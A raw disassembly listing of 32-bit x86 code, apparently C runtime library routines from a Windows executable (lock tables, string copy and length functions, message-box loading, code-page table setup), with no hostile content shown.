  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
